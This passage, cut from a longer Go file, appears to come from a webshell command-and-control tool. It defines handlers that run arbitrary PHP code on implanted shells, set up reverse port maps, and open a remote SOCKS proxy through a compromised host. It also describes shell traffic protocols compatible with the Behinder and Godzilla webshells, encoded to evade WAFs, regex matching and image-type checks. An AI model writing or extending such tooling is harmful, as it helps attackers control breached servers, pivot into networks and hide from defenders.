		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 port 参数"})
		return
	}
	if err := m.getAgent(sh).ReversePortMapStop(req.Port); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── RemoteSocksProxy ─────────────────────────────────────────────────────────

func (m *Module) remoteSocksStart(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		RemoteIP   string `json:"remoteIp"`
		RemotePort int    `json:"remotePort"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.RemoteIP == "" || req.RemotePort <= 0 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 remoteIp/remotePort 参数"})
		return
	}
	if err := m.getAgent(sh).RemoteSocksCreate(req.RemoteIP, req.RemotePort); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (m *Module) remoteSocksStop(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	if err := m.getAgent(sh).RemoteSocksStop(); err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

// ─── 插件 ─────────────────────────────────────────────────────────────────────

func (m *Module) pluginExec(w http.ResponseWriter, r *http.Request, id string) {
	sh, ok := m.loadShell(w, id)
	if !ok {
		return
	}
	var req struct {
		Code   string `json:"code"`   // PHP 插件代码（base64 或明文）
		Base64 bool   `json:"base64"` // code 是否已 base64 编码
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Code == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "缺少 code 参数"})
		return
	}
	output, err := m.getAgent(sh).PluginExec(req.Code, req.Base64)
	if err != nil {
		writeJSON(w, http.StatusOK, map[string]any{"ok": false, "error": err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "output": output})
}

// protocolDesc 返回协议的人类可读说明，便于前端在代码生成器中展示。
func protocolDesc(shellType, protocol string) string {
	if shellType == "jsp" {
		return "AES-128-ECB | POST body = base64(AES(action\\nbase64(arg)...))，响应 JSON {status,msg:base64(result)}"
	}
	if shellType == "aspx" {
		return "AES-128-CBC(IV=Key) | POST body = base64(CBC(action\\nbase64(arg)...))，响应 JSON {status,msg:base64(result)}"
	}
	if shellType == "asp" {
		return "XOR | POST body = 原始XOR字节流"
	}
	if shellType == "python" {
		if protocol == "aes_gcm" {
			return "AES-256-GCM | POST body = base64(nonce[12]+cipher+tag[16])，响应 JSON {status,msg:base64(result)}，适用于 CGI/WSGI/Flask/Django"
		}
		return "AES-128-ECB 行协议（同 JSP）| POST body = base64(AES(action\\nbase64(arg)...))，响应 JSON {status,msg:base64(result)}，适用于 CGI/WSGI/Flask/Django"
	}
	switch protocol {
	case "behinder_v3":
		return "冰蝎v3 | GET握手获取随机会话密钥（无硬编码），POST body = base64(AES-128-ECB(key, code))，php://input原始流"
	case "behinder_v4":
		return "冰蝎v4 | GET握手获取随机会话密钥，POST form: [key]=base64(AES-128-ECB(key, code))，参数名即会话密钥，可直连冰蝎v4部署的Shell"
	case "godzilla_php_aes":
		return "哥斯拉兼容 | key=MD5(strrev(pass))[0:16]，POST body = md5(key+key)[32字节] + base64(AES-128-ECB(key,code))，可直连哥斯拉v4部署的Shell"
	case "default_xor":
		return "XOR | POST body = 原始XOR字节流（无base64，最轻量）"
	case "default_xor_base64":
		return "XOR | POST body = base64(XOR字节流)（比 default_xor 多一层base64编码）"
	case "default_image":
		return "AES-128-ECB | POST body = 8字节PNG伪头 + base64(cipher)（绕过图片类型检测）"
	case "default_json":
		return "AES-128-ECB | POST body = JSON {\"pass\":\"base64(cipher)\"}（JSON格式传输）"
	case "aes_with_magic":
		return "AES-128-ECB | POST body = 16字节随机魔法前缀 + base64(cipher)（绕过正则匹配检测）"
	case "default_aes_form":
		return "AES-128-ECB | POST body = _=<urlencode(base64(cipher))>（FORM表单格式伪装，看起来像普通AJAX POST，绕 WAF body 特征检测）"
	case "aes_gcm":
		return "AES-256-GCM | POST body = base64(nonce[12]+cipher+tag[16])（每次密文不同，AEAD完整性校验，抗流量统计分析）"
	default:
		return "AES-128-ECB | POST body = base64(cipher)（AEGIS自研标准协议，推荐）"
	}
}
